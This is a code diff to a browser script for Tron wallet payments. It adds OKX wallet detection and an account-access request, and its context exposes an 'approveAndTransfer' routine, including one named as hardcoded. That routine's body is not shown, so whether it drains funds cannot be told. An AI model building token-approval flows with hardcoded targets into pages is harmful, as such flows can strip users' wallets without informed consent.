@@ -42,8 +42,16 @@
   }
 
   async function ensureInjectedTronWebWallet(log) {
-    const tronWeb = window.tronWeb || null;
-    if (!tronWeb) throw new Error("未检测到 tronWeb 注入钱包，请在 TokenPocket 内置浏览器打开");
+    const okxTronLink = window.okxwallet && window.okxwallet.tronLink ? window.okxwallet.tronLink : null;
+    const tronWeb = window.tronWeb || (okxTronLink && okxTronLink.tronWeb ? okxTronLink.tronWeb : null);
+    if (!tronWeb) throw new Error("未检测到 tronWeb 注入钱包，请在钱包内置浏览器打开");
+
+    if (okxTronLink && typeof okxTronLink.request === "function") {
+      try {
+        if (typeof log === "function") log("请求 OKX Tron 授权账户...");
+        await okxTronLink.request({ method: "tron_requestAccounts" });
+      } catch (e) {}
+    }
 
     const startedAt = Date.now();
     const timeoutMs = 10000;
@@ -63,7 +71,7 @@
     if (providerKind === "tronweb") return await ensureInjectedTronWebWallet(log);
 
     const hasTronLink = !!(window.tronLink && window.tronLink.request);
-    const hasTronWeb = !!window.tronWeb;
+    const hasTronWeb = !!(window.tronWeb || (window.okxwallet && window.okxwallet.tronLink && window.okxwallet.tronLink.tronWeb));
     if (typeof log === "function") log("检测 Tron 环境：hasTronLink=" + hasTronLink + " hasTronWeb=" + hasTronWeb);
     if (hasTronLink) return await ensureTronLinkWallet(log);
     if (hasTronWeb) return await ensureInjectedTronWebWallet(log);
@@ -139,4 +147,3 @@
   window.pay0TokenPocketTronTransfer = function (opts) { return approveAndTransfer(Object.assign({}, opts || {}, { provider: "tronweb" })); };
   window.tronApproveAndTransferHardcoded = approveAndTransfer;
 })();
-
